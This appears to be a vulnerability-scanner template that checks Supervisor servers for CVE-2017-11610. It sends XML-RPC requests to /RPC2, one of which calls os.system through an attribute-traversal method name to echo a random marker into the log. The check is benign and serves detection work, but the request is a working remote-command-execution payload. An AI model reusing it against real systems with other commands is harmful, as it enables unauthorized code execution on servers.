name: yaml-poc-supervisord-supervisor-unauthorized_access-CVE-2017-11610
binding: 078ead51-ba5c-4f81-8d1b-4c8cbe3a2956
detail:
    author: yang.yu
    links:
        - http://www.debian.org/security/2017/dsa-3942
        - https://access.redhat.com/errata/RHSA-2017:3005
        - https://blogs.securiteam.com/index.php/archives/3348
        - https://github.com/Supervisor/supervisor
        - https://github.com/Supervisor/supervisor/blob/3.0.1/CHANGES.txt
        - https://github.com/Supervisor/supervisor/blob/3.1.4/CHANGES.txt
        - https://github.com/Supervisor/supervisor/blob/3.2.4/CHANGES.txt
        - https://github.com/Supervisor/supervisor/blob/3.3.3/CHANGES.txt
        - https://github.com/Supervisor/supervisor/issues/964
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/4GMSCGMM477N64Z3BM34RWYBGSLK466B/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DTPDZV4ZRICDYAYZVUHSYZAYDLRMG2IM/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JXGWOJNSWWK2TTWQJZJUP66FLFIWDMBQ/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4GMSCGMM477N64Z3BM34RWYBGSLK466B/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DTPDZV4ZRICDYAYZVUHSYZAYDLRMG2IM/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JXGWOJNSWWK2TTWQJZJUP66FLFIWDMBQ/
        - https://security.gentoo.org/glsa/201709-06
        - https://www.debian.org/security/2017/dsa-3942
        - https://www.exploit-db.com/exploits/42779/
        - https://www.seebug.org/vuldb/ssvid-96316
    vulnerability:
        id: ddbbd3f3-08bd-4c77-8195-73ccdc0940ab
        level: high
    warning: Harmless
transport: http
set:
    randomString: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.supervisord.options.logfile.strip</methodName>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && "<value><string>(?<file>.+?)<\\/string><\\/value>".bmatches(response.body)
        output:
            search: '"<value><string>(?<file>.+?)<\\/string><\\/value>".bsubmatch(response.body)'
            file: search["file"]
    r1:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
                      <params>
                      <param>
                      <string>echo {{randomString}} >> {{file}}</string>
                      </param>
                      </params>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && response.body.bcontains(b"<value><int>0</int></value>")
    r2:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.readLog</methodName>
                      <params>
                      <param>
                      <int>-200</int>
                      </param>
                      <param>
                      <int>0</int>
                      </param>
                      </params>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && response.body.bcontains(bytes(randomString))
expression: r0() && r1() && r2()
